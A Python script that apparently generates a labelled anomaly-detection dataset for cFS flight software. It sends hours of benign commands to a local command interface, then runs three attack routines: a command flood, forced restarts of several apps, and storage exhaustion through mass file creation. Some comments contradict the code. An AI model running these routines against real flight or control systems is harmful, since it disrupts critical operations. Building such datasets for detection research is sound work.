import subprocess
import csv
from datetime import datetime, timezone
import time
import random

# ==============================
# Configuration
# ==============================
start_time_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")

random.seed(42)

normal_traffic_hours = 8  # hours of normal-only traffic
normal_probability = 0.5   # how often normal traffic is sent

attack_interval = 40 * 60  # 40 minutes in seconds
normal_duration = 3600 * normal_traffic_hours #Attack time in seconds

# Attack counters (for logs)
dos_count = 0
life_count = 0
storage_count = 0

# Normal data
normal_data = [
    ("0x1806", 0),  # CFE_ES NOOP
    ("0x1801", 0),  # CFE_EVS NOOP
    ("0x1803", 0),  # CFE_SB NOOP
    ("0x1804", 0),  # CFE_TBL NOOP
    ("0x1805", 0),  # CFE_TIME NOOP
    ("0x1884", 0),  # CI_LAB NOOP
    ("0x1880", 0),  # TO_LAB NOOP
    ("0x1882", 0),  # SAMPLE_APP NOOP

    ("0x1805", 8),  # CFE_TIME SEND_DIAGNOSTIC_TLM
    ("0x1806", 1),  # CFE_ES RESET_COUNTERS
    ("0x1801", 1),  # CFE_EVS RESET_COUNTERS
    ("0x1803", 1),  # CFE_SB RESET_COUNTERS
    ("0x1804", 1),  # CFE_TBL RESET_COUNTERS
    ("0x1805", 1),  # CFE_TIME RESET_COUNTERS
    ("0x1884", 1),  # CI_LAB RESET_COUNTERS
    ("0x1880", 1),  # TO_LAB RESET_COUNTERS
]

# ==============================
# Send command to CI_LAB and log it
# ==============================
def send_cmd(pktid, cmdcode, anomaly, kind, extra=None):
    cmd = ["./cmdUtil", "--host=127.0.0.1", "--port=1234",
           f"--pktid={pktid}", f"--cmdcode={cmdcode}"]
    if extra:
        cmd.extend(extra)
    subprocess.run(cmd)
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    print(f"DoS: {dos_count}  Lifecycle: {life_count}  Storage: {storage_count}  Time: {timestamp}")
    with open(f"log{start_time_str}.csv", "a", newline="") as f:
        csv.writer(f).writerow([timestamp, pktid, cmdcode, anomaly, kind,
                                f"dos count: {dos_count}",
                                f"lifecycle count: {life_count}",
                                f"storage count: {storage_count}"])

# ==============================
# Send normal data command
# ==============================
def maybe_send_normal():
    if random.random() < normal_probability:
        pktid, cmdcode = random.choice(normal_data)
        send_cmd(pktid, cmdcode, False, "normal")

# ==============================
# Perform Attacks
# ==============================
def dos():
    global dos_count
    dos_count += 1
    for _ in range(100):
        send_cmd("0x1806", 0, True, "dos")

def lifecycle():  # Restarts SAMPLE_APP, CI_LAB, TO_LAB
    global life_count
    life_count += 1
    for app in ["SAMPLE_APP", "CI_LAB", "TO_LAB"]:
        send_cmd("0x1806", 4, True, f"lifecycle_restart_{app.lower()}",
                 extra=[f"--string=20:{app}"])

def storage_exhaustion():  # Creates 200 files
    global storage_count
    storage_count += 1
    for i in range(100):
        send_cmd("0x1806", 11, True, "storage_exhaustion",
                 extra=[f"--string=64:/cf/exhaust_{i:04d}.log"])

attacks = [dos, lifecycle, storage_exhaustion]

# ==============================
# Run
# ==============================
# Normal traffic for 18 hours
start = time.monotonic()
while time.monotonic() - start < normal_duration:
    maybe_send_normal()
    time.sleep(1)

# 3 attacks, one every 40 minutes (covers 2 hours).
for attack in attacks:
    attack()                    
    next_attack = time.monotonic() + attack_interval
    while time.monotonic() < next_attack:
        maybe_send_normal()
        time.sleep(1)